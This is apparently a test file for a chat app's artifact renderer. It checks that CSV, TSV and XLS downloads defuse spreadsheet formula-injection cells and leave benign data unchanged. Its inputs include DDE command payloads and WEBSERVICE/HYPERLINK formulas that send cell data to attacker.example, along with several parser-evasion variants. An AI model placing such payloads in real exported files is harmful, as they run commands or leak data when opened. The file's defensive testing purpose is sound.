import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { render, screen, fireEvent } from '@testing-library/react';
import { ArtifactRenderer } from '../ArtifactRenderer';
import type { Artifact } from '../../lib/types';

interface CapturedDownload {
  filename: string;
  body: string;
  mime: string;
}

const captured: CapturedDownload[] = [];

function makeArtifact(type: Artifact['type'], content: string, language?: string): Artifact {
  return { id: 'a1', type, title: 'Q3 report', content, language };
}

function download(type: Artifact['type'], content: string, language?: string): CapturedDownload {
  render(<ArtifactRenderer artifact={makeArtifact(type, content, language)} />);
  fireEvent.click(screen.getByLabelText('Download or export artifact'));
  fireEvent.click(screen.getByText(/^Download as (CSV|TSV|TAB|XLS|text)$/));
  const last = captured[captured.length - 1];
  expect(last).toBeDefined();
  return last!;
}

beforeEach(() => {
  captured.length = 0;
  const RealBlob = globalThis.Blob;
  let pending: { body: string; mime: string } | null = null;
  class RecordingBlob extends RealBlob {
    constructor(parts: BlobPart[] = [], options?: BlobPropertyBag) {
      super(parts, options);
      pending = { body: parts.map(String).join(''), mime: options?.type ?? '' };
    }
  }
  vi.stubGlobal('Blob', RecordingBlob);
  URL.createObjectURL = vi.fn(() => 'blob:artifact-test');
  URL.revokeObjectURL = vi.fn();
  vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(function (
    this: HTMLAnchorElement,
  ) {
    if (pending) captured.push({ filename: this.download, ...pending });
    pending = null;
  });
});

afterEach(() => {
  vi.unstubAllGlobals();
  vi.restoreAllMocks();
});

describe('ArtifactRenderer · Download as CSV', () => {
  const singleCellPayloads = [
    "=cmd|'/c calc'!A0",
    '=WEBSERVICE("http://attacker.example/x"&A1)',
    "@SUM(1+1)*cmd|'/c calc'!A0",
    '\t=1+1',
    ' =1+1',
    '+1+cmd',
    '-2+3+cmd',
  ];

  it.each(singleCellPayloads)('neutralizes a payload the table parser rejects: %j', (payload) => {
    const file = download('spreadsheet', payload);
    expect(file.filename).toBe('Q3 report.csv');
    expect(file.body).not.toBe(payload);
    expect(file.body.replace(/^"/, '')).toMatch(/^'/);
    expect(file.mime).toBe('text/csv;charset=utf-8;');
  });

  it('neutralizes a formula cell inside a table without rewriting the rest of the row', () => {
    const file = download('table', 'name,link\nAcme,=HYPERLINK("http://attacker.example"&A2)');
    expect(file.body).toBe('name,link\nAcme,\'=HYPERLINK("http://attacker.example"&A2)');
  });

  it('leaves a benign table byte-identical', () => {
    expect(download('csv', 'name,score\nAlice,30\nBob,-7').body).toBe(
      'name,score\nAlice,30\nBob,-7',
    );
  });

  it('guards the record a lone CR starts, the way an importer reads the file', () => {
    const file = download('table', 'name,link\nAcme,1\r=HYPERLINK("http://attacker.example")');
    expect(file.body).toBe('name,link\nAcme,1\r\'=HYPERLINK("http://attacker.example")');
  });

  // a leading number used to exempt the whole cell, so the attacker only had to pick where
  // the number ended: a quoted newline is formula whitespace, and ',' is the decimal
  // separator in the locale whose Excel splits .csv on ';'
  it('guards a payload a leading number is glued to', () => {
    const payload = 'qty\n"+1\n+WEBSERVICE(""http://attacker.example/?d=""&A1)"';
    const file = download('spreadsheet', payload);
    expect(file.body).not.toBe(payload);
    expect(file.body).toBe('qty\n"\'+1\n+WEBSERVICE(""http://attacker.example/?d=""&A1)"');
  });

  it('guards a decimal-comma payload the comma reading mistakes for a number', () => {
    const payload = "qty,note\n-1,2+cmd|'/c calc'!A0";
    const file = download('table', payload);
    expect(file.body).not.toBe(payload);
    expect(file.body).toBe("qty,note\n'-1,2+cmd|'/c calc'!A0");
  });

  it('guards a tab-delimited artifact that lands under a .csv name', () => {
    const file = download('csv', 'name\tvalue\nalice\t=WEBSERVICE("http://attacker.example")');
    expect(file.body).toBe('name\tvalue\nalice\t\'=WEBSERVICE("http://attacker.example")');
  });

  it.each([
    'name,,city\r\nA,B\r\n1,2,3,4\r\n\r\n',
    ' name ; score \nAlice;30\n',
    '"quoted",plain\n"still ""quoted""",2',
  ])('exports %j exactly as the model wrote it', (content) => {
    expect(download('csv', content).body).toBe(content);
  });

  it('does not rewrite non-tabular artifacts', () => {
    const file = download('markdown', '=1+1');
    expect(file.body).toBe('=1+1');
    expect(file.mime).toBe('text/plain');
    expect(file.filename).toBe('Q3 report.md');
  });
});

describe('ArtifactRenderer · downloads named by artifact.language', () => {
  it.each([
    ['csv', 'text/csv;charset=utf-8;'],
    ['tsv', 'text/tab-separated-values;charset=utf-8;'],
    ['xls', 'text/csv;charset=utf-8;'],
  ])('neutralizes a code artifact that lands as .%s', (language, mime) => {
    const payload = "=cmd|'/c calc'!A0";
    const file = download('code', payload, language);
    expect(file.filename).toBe(`Q3 report.${language}`);
    expect(file.body).not.toBe(payload);
    expect(file.body.replace(/^"/, '')).toMatch(/^'/);
    expect(file.mime).toBe(mime);
  });

  it('leaves a real code artifact byte-identical', () => {
    const file = download('code', 'const total = -1 + 2;', 'ts');
    expect(file.body).toBe('const total = -1 + 2;');
    expect(file.mime).toBe('text/plain');
    expect(file.filename).toBe('Q3 report.ts');
  });
});

describe('ArtifactRenderer · json array-of-objects spreadsheets', () => {
  const people = JSON.stringify([
    { Name: 'Alice', Age: 30 },
    { Name: 'Bob', Age: 41 },
  ]);

  it('downloads the grid the artifact renders, not its json literal', () => {
    const file = download('spreadsheet', people);
    expect(file.filename).toBe('Q3 report.csv');
    expect(file.mime).toBe('text/csv;charset=utf-8;');
    expect(file.body).toBe('Name,Age\nAlice,30\nBob,41');
  });

  it('neutralizes a formula carried in a json cell', () => {
    const file = download('table', JSON.stringify([{ name: 'Acme', link: "=cmd|'/c calc'!A0" }]));
    expect(file.body).toBe("name,link\nAcme,'=cmd|'/c calc'!A0");
  });
});
